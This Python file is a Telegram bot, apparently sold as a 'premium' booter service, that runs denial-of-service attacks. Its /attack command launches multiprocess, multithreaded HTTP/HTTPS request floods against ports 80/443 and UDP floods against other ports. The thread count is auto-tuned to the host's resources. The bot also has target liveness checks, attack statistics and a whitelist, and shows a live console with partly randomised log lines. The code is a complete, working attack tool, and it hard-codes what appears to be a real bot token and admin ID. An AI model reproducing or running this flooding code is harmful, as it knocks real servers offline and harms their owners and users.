#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DDoS Ultimate - Tự động tối ưu, một lệnh /attack duy nhất.
Dựa trên cơ chế ddos.py gốc: multiprocessing + threading, hyper_chunks, payload_raw.
"""

import telebot
import threading
import socket
import time
import ssl
import random
import multiprocessing
import os
import json
import resource

# ================= CONFIGURATION =================
TOKEN = "8035049957:AAFvprG7V31u39UGxw_y_m5_UCBRvphQRxA"  # Thay token của bạn
bot = telebot.TeleBot(TOKEN)

ADMIN_NAME = "Shady taro"
ADMIN_IDS = [5225888903]  # Thay ID admin của bạn

# ----------------- AUTO DETECT TÀI NGUYÊN VPS -----------------
def get_available_ram_mb():
    try:
        with open("/sys/fs/cgroup/memory/memory.limit_in_bytes", "r") as f:
            limit = int(f.read().strip())
            if limit > 10 * 1024**3:
                limit = None
        if limit:
            with open("/sys/fs/cgroup/memory/memory.usage_in_bytes", "r") as f:
                used = int(f.read().strip())
            return max(100, (limit - used) // (1024 * 1024))
    except:
        pass
    try:
        import psutil
        return psutil.virtual_memory().available // (1024 * 1024)
    except:
        return 1024

def get_pids_limit():
    try:
        with open("/sys/fs/cgroup/pids/pids.max", "r") as f:
            val = f.read().strip()
            if val != "max":
                return int(val)
    except:
        pass
    try:
        soft, hard = resource.getrlimit(resource.RLIMIT_NPROC)
        if hard > 0:
            return hard
    except:
        pass
    return 4096

def auto_tune():
    ram_mb = get_available_ram_mb()
    pids_limit = get_pids_limit()
    try:
        with open("/sys/fs/cgroup/pids/pids.current", "r") as f:
            current = int(f.read().strip())
    except:
        current = 0
    # Mỗi thread ngốn ~8MB, mỗi process overhead 50MB
    max_threads_by_ram = max(50, ram_mb // 8)
    max_threads_by_pids = pids_limit - current - 100
    max_total_threads = min(max_threads_by_ram, max_threads_by_pids, 8000)
    max_total_threads = max(max_total_threads, 200)
    cpu = multiprocessing.cpu_count()
    max_proc = min(cpu, 4)   # tối đa 4 process để tránh overhead
    threads_per_proc = max_total_threads // max_proc
    if threads_per_proc < 20:
        threads_per_proc = 20
        max_proc = max_total_threads // 20
    return max_proc, threads_per_proc, max_total_threads

CPU_COUNT, THREADS_PER_PROC, TOTAL_THREADS = auto_tune()
print(f"[AUTO] RAM khả dụng: {get_available_ram_mb()} MB")
print(f"[AUTO] Dùng {CPU_COUNT} processes × {THREADS_PER_PROC} threads = {TOTAL_THREADS} total")

# ================= DỮ LIỆU =================
SHARED_SUCCESS = multiprocessing.Value('L', 0)
WHITELIST_FILE = "whitelist.txt"
STATS_FILE = "stats.json"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36"
]

PATHS = ["/", "/index.html", "/api/v1/ping", "/login"]

ADS_MESSAGE = (
    "━━━━━━━━━━━━━━━━━━\n"
    "💎 **PREMIUM SERVICE BY XHOPE** 💎\n"
    "• *Uptime:* `99.9% Online`\n"
    "• *Support:* [xHope](https://t.me/hopedzx)\n"
    "━━━━━━━━━━━━━━━━━━"
)

HELP_MESSAGE = (
    "🌟 **HỆ THỐNG ĐIỀU KHIỂN** 🌟\n\n"
    "🚀 **LỆNH DUY NHẤT:**\n"
    "└ `/attack <IP> <Port> [seconds]`\n"
    "   * Port 80/443 → HTTP/HTTPS flood\n"
    "   * Other ports → UDP flood\n"
    "   * Mặc định 60 giây\n\n"
    "🛑 **LỆNH DỪNG:**\n"
    "└ `/stop`\n\n"
    "🔍 **CÔNG CỤ:**\n"
    "├ `/check <IP> <Port>`\n"
    "├ `/stats`\n"
    "├ `/id`\n"
    "├ `/wadd <IP>`\n"
    "└ `/wlist`\n\n"
    "{ads}"
)

# ================= DATA MANAGEMENT =================
def load_stats():
    if not os.path.exists(STATS_FILE):
        return {"total_attacks": 0, "total_hits": 0}
    with open(STATS_FILE, "r") as f:
        try:
            return json.load(f)
        except:
            return {"total_attacks": 0, "total_hits": 0}

def save_stats(stats):
    with open(STATS_FILE, "w") as f:
        json.dump(stats, f)

def update_attack_stats(hits):
    stats = load_stats()
    stats["total_attacks"] += 1
    stats["total_hits"] += hits
    save_stats(stats)

def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def load_whitelist():
    if not os.path.exists(WHITELIST_FILE):
        return set()
    with open(WHITELIST_FILE, "r") as f:
        return set(line.strip() for line in f if line.strip())

def save_whitelist(whitelist):
    with open(WHITELIST_FILE, "w") as f:
        for ip in whitelist:
            f.write(f"{ip}\n")

# ================= ATTACK ENGINE (CHỈ TCP CHO 80/443, UDP CHO CÁC PORT KHÁC) =================
def attack_worker(ip, port, stop_event, shared_counter):
    payload_raw = os.urandom(2048)
    hyper_chunks = []
    for _ in range(5):
        chunk = b""
        for _ in range(1000):
            ua = random.choice(USER_AGENTS)
            path = random.choice(PATHS)
            chunk += (f"GET {path}?{random.getrandbits(16)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\n\r\n").encode()
        hyper_chunks.append(chunk)

    def run_attack():
        while not stop_event.is_set():
            try:
                if port in [80, 443]:  # TCP/HTTP(S)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    s.settimeout(4)
                    if port == 443:
                        s = ssl._create_unverified_context().wrap_socket(s, server_hostname=ip)
                    s.connect((ip, port))
                    while not stop_event.is_set():
                        try:
                            s.send(random.choice(hyper_chunks))
                            with shared_counter.get_lock():
                                shared_counter.value += 1000
                        except:
                            break
                    s.close()
                else:  # UDP flood
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4194304)
                    while not stop_event.is_set():
                        try:
                            s.sendto(payload_raw, (ip, port))
                            with shared_counter.get_lock():
                                shared_counter.value += 1
                        except:
                            break
                    s.close()
            except:
                time.sleep(0.01)

    # Tạo các luồng cho process hiện tại
    threads = []
    for _ in range(THREADS_PER_PROC):
        t = threading.Thread(target=run_attack, daemon=True)
        t.start()
        threads.append(t)
    # Chờ stop
    for t in threads:
        t.join()
    stop_event.wait()

def monitor_report(chat_id, msg_id, ip, port, stop_event, shared_counter):
    last_val = 0
    start_time = time.time()
    attack_type = "HTTP" if port in [80,443] else "UDP"
    real_bot_logs = [
        f"[INFO] Hyper-Engine on Core {random.randint(1, CPU_COUNT)}",
        f"[DEBUG] Buffer flushed: 4MB",
        f"[INFO] {attack_type} Established",
        f"[DEBUG] Batch sync: +1000 hits" if attack_type == "HTTP" else "[DEBUG] Packet sent",
        f"[INFO] {THREADS_PER_PROC} threads/core",
        f"[WARN] Reconnecting...",
        f"[DEBUG] Monster-chunk sent" if attack_type == "HTTP" else "[DEBUG] UDP flood",
        f"[INFO] SSL/TLS verified" if port == 443 else "",
    ]
    while not stop_event.is_set():
        try:
            time.sleep(1.5)
            cur_val = shared_counter.value
            elapsed = time.time() - start_time
            rps = (cur_val - last_val) / 1.5
            last_val = cur_val
            scroll = "\n".join([f"› `{random.choice([l for l in real_bot_logs if l])}`" for _ in range(3)])
            m, s = divmod(int(elapsed), 60)
            status_text = (
                f"🚀 **ATTACK STATUS: ONLINE** 🚀\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🎯 **Target:** `{ip}:{port}` ({attack_type})\n"
                f"✅ **Hits:** `{cur_val:,}` | ⚡ **RPS:** `{rps:,.0f}`\n"
                f"⏳ **Time:** `{m:02d}:{s:02d}`\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🖥 **LIVE CONSOLE:**\n"
                f"{scroll}\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"🔥 **Status:** `SYSTEM OVERLOADED`"
            )
            bot.edit_message_text(status_text, chat_id, msg_id, parse_mode='Markdown')
        except:
            pass
    final_hits = shared_counter.value
    update_attack_stats(final_hits)
    bot.send_message(chat_id, f"🛑 **ATTACK STOPPED:** `{ip}:{port}`\n📊 Total Hits: `{final_hits:,}`", parse_mode='Markdown')

# ================= HANDLERS =================
active_procs = []
stop_event = None

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.send_message(message.chat.id, HELP_MESSAGE.format(ads=ADS_MESSAGE), parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global active_procs, stop_event
    if len(active_procs) > 0:
        bot.reply_to(message, "⚠️ **Another attack is running! Use /stop first.**")
        return
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "❌ **Usage:** `/attack <IP> <Port> [duration]`\nDefault duration = 60s")
        return
    ip = parts[1]
    whitelist = load_whitelist()
    if ip in whitelist:
        bot.reply_to(message, f"🛡 **IP `{ip}` is whitelisted!**")
        return
    try:
        port = int(parts[2])
    except:
        bot.reply_to(message, "❌ Port must be integer")
        return
    duration = int(parts[3]) if len(parts) > 3 else 60

    SHARED_SUCCESS.value = 0
    stop_event = multiprocessing.Event()
    attack_type = "HTTP/HTTPS" if port in [80,443] else "UDP"
    initial_msg = bot.reply_to(
        message,
        f"⚡ **STARTING {attack_type} ATTACK**\n"
        f"🎯 `{ip}:{port}`\n"
        f"🚀 {CPU_COUNT} processes × {THREADS_PER_PROC} threads\n"
        f"⏱️ Duration: {duration}s\n🔒 **LOCKED**"
    )
    for _ in range(CPU_COUNT):
        p = multiprocessing.Process(target=attack_worker, args=(ip, port, stop_event, SHARED_SUCCESS))
        p.daemon = True
        p.start()
        active_procs.append(p)
    threading.Thread(target=monitor_report, args=(message.chat.id, initial_msg.message_id, ip, port, stop_event, SHARED_SUCCESS), daemon=True).start()
    # Tự động dừng sau duration giây
    def auto_stop():
        time.sleep(duration)
        if stop_event and not stop_event.is_set():
            stop_event.set()
            for p in active_procs:
                try: p.terminate()
                except: pass
            active_procs.clear()
    threading.Thread(target=auto_stop, daemon=True).start()

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    global active_procs, stop_event
    if not is_user_admin(message.from_user.id):
        bot.reply_to(message, "🚫 **Permission Denied!**")
        return
    if stop_event:
        stop_event.set()
    for p in active_procs:
        try: p.terminate()
        except: pass
    active_procs.clear()
    bot.reply_to(message, "🛑 **ATTACK STOPPED!** (Unlocked)")

@bot.message_handler(commands=['check'])
def handle_check(message):
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ /check <IP> [Port]")
        return
    ip = parts[1]
    port = int(parts[2]) if len(parts) > 2 else 80
    msg = bot.reply_to(message, f"🔍 Checking `{ip}:{port}`...", parse_mode='Markdown')
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        start = time.time()
        result = s.connect_ex((ip, port))
        end = time.time()
        s.close()
        if result == 0:
            bot.edit_message_text(f"✅ **SERVER ALIVE**\nPing: `{int((end-start)*1000)}ms`", message.chat.id, msg.message_id, parse_mode='Markdown')
        else:
            bot.edit_message_text(f"❌ **SERVER DEAD**\nPort closed/filtered", message.chat.id, msg.message_id, parse_mode='Markdown')
    except Exception as e:
        bot.edit_message_text(f"Error: {e}", message.chat.id, msg.message_id)

@bot.message_handler(commands=['stats'])
def handle_stats(message):
    if not is_user_admin(message.from_user.id):
        bot.reply_to(message, "🚫 Admin only!")
        return
    stats = load_stats()
    txt = (
        f"📊 **SYSTEM STATS**\n"
        f"🚀 Attacks: `{stats['total_attacks']}`\n"
        f"✅ Hits: `{stats['total_hits']:,}`\n"
        f"🖥 Current config: {CPU_COUNT} proc × {THREADS_PER_PROC} thr = {TOTAL_THREADS}"
    )
    bot.reply_to(message, txt, parse_mode='Markdown')

@bot.message_handler(commands=['id'])
def handle_id(message):
    bot.reply_to(message, f"🆔 Your ID: `{message.from_user.id}`")

@bot.message_handler(commands=['wadd'])
def handle_wadd(message):
    if not is_user_admin(message.from_user.id):
        bot.reply_to(message, "🚫 Admin only!")
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ /wadd <IP>")
        return
    ip = parts[1]
    wl = load_whitelist()
    wl.add(ip)
    save_whitelist(wl)
    bot.reply_to(message, f"✅ Added `{ip}` to whitelist.", parse_mode='Markdown')

@bot.message_handler(commands=['wlist'])
def handle_wlist(message):
    if not is_user_admin(message.from_user.id):
        bot.reply_to(message, "🚫 Admin only!")
        return
    wl = load_whitelist()
    if not wl:
        bot.reply_to(message, "Whitelist empty.")
        return
    txt = "🛡 **WHITELIST**\n" + "\n".join(f"• `{ip}`" for ip in wl)
    bot.send_message(message.chat.id, txt, parse_mode='Markdown')

# ================= MAIN =================
if __name__ == "__main__":
    multiprocessing.freeze_support()
    print(f"--- SYSTEM READY | ADMIN: {ADMIN_NAME} ---")
    print(f"--- AUTO-TUNE: {CPU_COUNT} processes × {THREADS_PER_PROC} threads = {TOTAL_THREADS} total ---")
    while True:
        try:
            print("Bot polling...")
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(10)
